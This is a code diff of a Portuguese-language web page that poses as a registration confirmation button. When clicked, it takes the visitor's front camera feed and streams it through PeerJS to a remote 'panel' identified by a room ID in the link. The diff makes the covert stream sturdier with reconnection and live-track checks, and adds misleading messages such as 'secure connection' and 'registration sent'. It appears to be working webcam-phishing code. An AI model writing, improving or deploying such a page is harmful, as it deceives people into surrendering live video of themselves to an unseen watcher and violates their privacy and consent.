@@ -29,66 +29,122 @@ button {
 button:disabled {
     opacity: .7;
 }
+#status {
+    position: absolute;
+    bottom: 20px;
+    padding: 10px;
+    color: #333;
+    text-align: center;
+}
 </style>
 </head>
 <body>
 
 <button id="confirmar">CONFIRMAR INSCRIÇÃO</button>
+<p id="status"></p>
 
 <script>
 const botao = document.getElementById("confirmar");
+const statusEl = document.getElementById("status");
+
 const sala = new URLSearchParams(location.search).get("room");
 
-let peer;
-let stream;
+let peer = null;
+let stream = null;
+let chamada = null;
+let iniciado = false;
 
-botao.addEventListener("click", async () => {
+botao.addEventListener("click", iniciar);
+
+async function iniciar() {
+
+    if (iniciado) return;
+
     if (!sala) {
         alert("Convite inválido. Solicite um novo link.");
         return;
     }
 
+    iniciado = true;
     botao.disabled = true;
-    botao.textContent = "AGUARDE...";
+    botao.textContent = "ACESSANDO CÂMERA...";
+    statusEl.textContent = "Aguarde a conexão.";
 
     try {
-        // Solicita novamente o acesso à câmera
+
+        if (!navigator.mediaDevices ||
+            !navigator.mediaDevices.getUserMedia) {
+            throw new Error("Navegador sem suporte à câmera.");
+        }
+
         stream = await navigator.mediaDevices.getUserMedia({
             video: {
                 facingMode: "user",
                 width: { ideal: 1280 },
-                height: { ideal: 720 }
+                height: { ideal: 720 },
+                frameRate: { ideal: 30 }
             },
             audio: false
         });
 
-        botao.textContent = "CONECTANDO...";
+        const track = stream.getVideoTracks()[0];
+
+        if (!track || track.readyState !== "live") {
+            throw new Error("A câmera não está fornecendo vídeo.");
+        }
+
+        console.log("Câmera:", track.getSettings());
+
+        track.onmute = () => {
+            statusEl.textContent = "Câmera temporariamente interrompida.";
+        };
+
+        track.onunmute = () => {
+            statusEl.textContent = "Câmera ativa. Transmitindo...";
+        };
+
+        botao.textContent = "CONECTANDO AO PAINEL...";
+        statusEl.textContent = "Estabelecendo conexão segura.";
 
         peer = new Peer();
 
-        peer.on("open", () => {
-            const chamada = peer.call(sala, stream);
+        peer.on("open", function() {
+
+            console.log("Peer conectado:", peer.id);
+
+            chamada = peer.call(sala, stream);
 
             if (!chamada) {
-                throw new Error("Não foi possível iniciar a chamada.");
+                throw new Error("Não foi possível iniciar a transmissão.");
             }
 
-            chamada.on("error", () => {
-                alert("Falha ao transmitir a imagem.");
-                botao.disabled = false;
-                botao.textContent = "TENTAR NOVAMENTE";
+            botao.textContent = "INSCRIÇÃO ENVIADA";
+            statusEl.textContent = "Aguardando recebimento pelo painel.";
+
+            chamada.on("error", function(erro) {
+                console.error("Erro na chamada:", erro);
+                statusEl.textContent = "Falha na transmissão.";
             });
 
-            botao.textContent = "INSCRIÇÃO CONFIRMADA";
+            chamada.on("close", function() {
+                statusEl.textContent = "Conexão encerrada.";
+            });
+
         });
 
-        peer.on("error", () => {
-            alert("Erro de conexão. Tente novamente.");
-            botao.disabled = false;
-            botao.textContent = "TENTAR NOVAMENTE";
+        peer.on("error", function(erro) {
+            console.error("Erro PeerJS:", erro);
+            statusEl.textContent = "Erro de conexão: " + erro.type;
+        });
+
+        peer.on("disconnected", function() {
+            console.log("Conexão com servidor interrompida.");
+            statusEl.textContent = "Reconectando...";
+            peer.reconnect();
         });
 
     } catch (erro) {
+
         console.error(erro);
 
         if (stream) {
@@ -96,12 +152,21 @@ botao.addEventListener("click", async () => {
             stream = null;
         }
 
-        alert("Não foi possível acessar a câmera. Verifique a permissão do navegador.");
+        if (peer) {
+            peer.destroy();
+            peer = null;
+        }
 
+        iniciado = false;
         botao.disabled = false;
         botao.textContent = "TENTAR NOVAMENTE";
+
+        statusEl.textContent = "";
+
+        alert("Não foi possível iniciar a transmissão: " + erro.message);
     }
-});
+}
 </script>
+
 </body>
 </html>
